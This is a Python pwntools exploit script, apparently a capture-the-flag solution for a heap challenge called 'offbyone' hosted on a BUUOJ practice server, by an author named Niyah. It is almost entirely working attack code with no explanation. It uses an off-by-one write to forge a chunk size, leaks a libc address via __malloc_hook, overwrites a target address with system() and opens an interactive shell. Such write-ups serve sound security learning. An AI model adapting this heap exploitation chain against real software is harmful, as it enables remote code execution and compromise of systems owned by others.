# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './offbyone'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26023'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('4:edi',num)

def add( size,text = 'a'):
    cmd(1)
    sla('input len' , size)
    sa('data' , text)

def edit(idx , text):
    cmd(4)
    sla('id' , idx)
    sa('data' , text)

def show(idx ):
    cmd(3)
    sla('id' , idx)

def delete(idx ):
    cmd(2)
    sla('id' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0xf8 )
    add(0xf8 ) #1
    add(0xf8 )
    add(0xf8 )
    add(0xf8 )
    add(0xf8 )
    add(0xf8 )
    add(0xf8 )
    delete(6)

    add(0xf8 , 'a'*0xf8)

    edit(6 , 'a'*0xf8 + p16(0x501))
    delete(0)
    add(0xf8 )

    show(1)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    add(0xf8) #8 #1
    delete(8)
    edit(1 , p64(0x602068))

    add(0xf8 , p64(system_addr))
    cmd('sh\x00')

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   offbyone.py
@Time    :   2022/02/07 22:12:06
@Author  :   Niyah 
'''